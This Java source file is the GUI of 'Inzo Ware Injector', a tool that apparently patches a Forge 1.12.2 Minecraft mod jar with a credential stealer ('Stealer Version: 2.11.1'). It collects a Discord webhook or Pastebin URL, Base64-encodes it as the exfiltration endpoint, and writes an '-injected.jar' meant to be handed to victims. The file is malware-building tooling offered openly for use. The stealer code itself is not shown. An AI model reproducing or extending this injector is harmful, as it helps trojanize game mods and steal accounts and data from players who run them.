package com.inzo.technologies.inzoware;

import com.inzo.technologies.inzoware.Injector;
import javax.swing.*;
import javax.swing.filechooser.FileFilter;
import java.io.File;
import com.formdev.flatlaf.FlatDarkLaf;
import java.util.Base64;
import javassist.NotFoundException;

public class InjectorGUI{

    public static void main(String[] args) throws NotFoundException{
        try {
            UIManager.setLookAndFeel(new FlatDarkLaf());
        }catch(Throwable ignored){}

        int result = 999;
        while(result != JOptionPane.YES_OPTION) {
            /*--- Home dialog ---*/
            String[] options = {"Inject", "About", "Close"};
            result = JOptionPane.showOptionDialog(
                    null,
                    "Inzo Ware Injector\n" +
                            "Requirements:\n" +
                            "   * Discord Webhook or PasteBin URL\n" +
                            "   * Target Hacked Client .jar file (1.12.2)",
                    "INZO_Technologies",
                    JOptionPane.YES_NO_CANCEL_OPTION,
                    JOptionPane.PLAIN_MESSAGE,
                    null,       //no custom icon
                    options,        //button titles
                    options[0]      //default button
            );

            if (result == JOptionPane.NO_OPTION) {
                JOptionPane.showMessageDialog(
                        null,
                        "Created by: INZO_Technologies,\n" +
                                "Injector Version: 0.0.4\n" +
                                "Stealer Version: 2.11.1\n" +
                                "Release Date: \n" +
                                "Credits: ThnksCJ, Skillnoob, NoWhere",
                        "INZO_Technologies",
                        JOptionPane.INFORMATION_MESSAGE
                );
            }

            if(result == JOptionPane.CANCEL_OPTION)
                return;
        }
        
         /*--- Get Files ---*/
        JFileChooser fc = new JFileChooser();
        fc.setFileFilter(new FileFilter() {
            @Override
            public boolean accept(File file) {
                return file.getName().endsWith(".jar") || file.isDirectory();
            }

            @Override
            public String getDescription() {
                return "Forge 1.12.2 Mod (*.jar)";
            }
        });

        int result1 = fc.showOpenDialog(null);

        //Out dialog cancelled
        if(result1 != JFileChooser.APPROVE_OPTION)
            return;

        String InPath = fc.getSelectedFile().getPath();

        int sep = InPath.lastIndexOf(".");
        String OutPath = InPath.substring(0, sep) + "-injected.jar";
        
        /*--- Query options ---*/
        Boolean pastebinurl;
        String URLlist;

        int sender = JOptionPane.showConfirmDialog(null, "Do you Want A Pastebin URL?", "Inzo Ware Injector", JOptionPane.YES_NO_OPTION);
         pastebinurl = sender == JOptionPane.YES_OPTION;

        URLlist = (String)JOptionPane.showInputDialog(
                null,
                "Insert " + (pastebinurl ? "PasteBin URL" : "Webhook") + ":",
                "Inzo Ware Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                ""
        );
        
        String SenderURL = URLlist;
        String encodedSenderURL = Base64.getEncoder().encodeToString(SenderURL.getBytes());
        System.out.println((pastebinurl ? "[INFO] PasteBin URL" : "[INFO] Webhook") + ": " + encodedSenderURL);

        /*--- Query options ---*/
        String MainClass;

        MainClass = (String)JOptionPane.showInputDialog(
                null,
                "Path To The Main Class:",
                "Inzo Ware Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                ""
        );

        System.out.println("[INFO] The Path Of The Main Class Is: " + MainClass);

        Injector.SimpleConfig sc = new Injector.SimpleConfig(pastebinurl, encodedSenderURL, MainClass);
        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);

        if(result2){
            JOptionPane.showMessageDialog(null, "InzoWare injection complete.\nIf this project helped you, considering starring it on GitHub.", "Inzo Ware Injector", JOptionPane.INFORMATION_MESSAGE);
        }else{
            JOptionPane.showMessageDialog(null, "InzoWare injection failed.\nPlease create a GitHub issue report if necessary.", "Inzo Ware Injector", JOptionPane.ERROR_MESSAGE);
        }

    }

    public static void displayError(String message){
        JOptionPane.showMessageDialog(null, message, "Inzo Ware Injector", JOptionPane.ERROR_MESSAGE);
    }
}
